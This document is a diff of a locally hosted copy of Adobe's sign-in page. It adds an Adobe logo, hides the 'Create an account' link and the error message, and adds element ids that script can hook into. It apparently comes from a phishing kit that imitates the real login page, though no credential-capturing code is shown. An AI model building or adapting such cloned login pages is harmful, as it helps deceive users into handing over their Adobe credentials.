@@ -19,8 +19,8 @@
                                 <section class="Content">
                                     <div class="CardLayout-Container EmailPage" data-id="">
                                         <div class="CardLayout-Toaster-Container">
-                                            <noscript></noscript>
                                             <section class="CardLayout">
+                                                <section id="mobileSwitch" class="ContextLogo"><div class="Context" data-id="Adobe-Default-Context"><div class="Context__header"><div class="Logo"><img class="Context__header-icon" data-id="Adobe-Default-Context-Icon-Black" src="../img/generic/adobe_logo_black.svg" alt="Adobe Logo"></div></div></div></section>
                                                 <header class="CardLayout__header"><h1
                                                         class="spectrum-Heading1 mb-xs-1">Sign in</h1></header>
                                                 <section class="CardLayout__content EmailPage__content">
@@ -28,8 +28,7 @@
                                                         <section class="EmailPage__email-field form-group"><h3
                                                                 class="spectrum-Heading3 EmailPage__continue-with-email mt-xs-1 mb-xs-0">
                                                             Continue with email</h3>
-                                                            <p class="EmailPage__instructions m-xs-0">New user? <a
-                                                                    class="spectrum-Link EmailPage__create-account-link"
+                                                            <p id="EmailPage__instructions" class="EmailPage__instructions m-xs-0"><span>Continue with email</span> <a style="display: none" class="spectrum-Link EmailPage__create-account-link"
                                                                     href="#" data-id="EmailPage-CreateAccountLink"
                                                                     rel="noopener noreferrer"> Create an account </a>
                                                             </p>
@@ -39,7 +38,7 @@
                                                                                         for="EmailPage-EmailField">Email
                                                                 address</label>
                                                                 <input type="email"
-                                                                                      class="spectrum-Textfield spectrum-Textfield--quiet is-invalid"
+                                                                                      class="spectrum-Textfield spectrum-Textfield--quiet"
                                                                                       autocomplete="email"
                                                                                       id="EmailPage-EmailField"
                                                                                       data-id="EmailPage-EmailField"
@@ -53,12 +52,12 @@
                                                                         placeholder="Password" type="password"
                                                                         tabindex="-1"></div>
                                                             </div>
-                                                            <label data-id="EmailPage-EmailField-Error" for="EmailPage-EmailField" class="spectrum-FieldLabel mod-error-label InlineError">We don't have an account with that email address.</label>
+                                                            <label style="display: none" id="errorMessage" data-id="EmailPage-EmailField-Error" for="EmailPage-EmailField" class="spectrum-FieldLabel mod-error-label InlineError">We don't have an account with that email address.</label>
                                                         </section>
                                                         <section data-columns="2" class="EmailPage__submit mod-submit">
                                                             <div class="ta-left"></div>
                                                             <div class="ta-right buttonParent">
-                                                                <button data-id="EmailPage-ContinueButton"
+                                                                <button id="buttonSubmit" data-id="EmailPage-ContinueButton"
                                                                         class="spectrum-Button spectrum-Button--cta SpinnerButton SpinnerButton--right"
                                                                         fdprocessedid="b6wvcq"><span
                                                                         class="spectrum-Button-label">Continue</span>
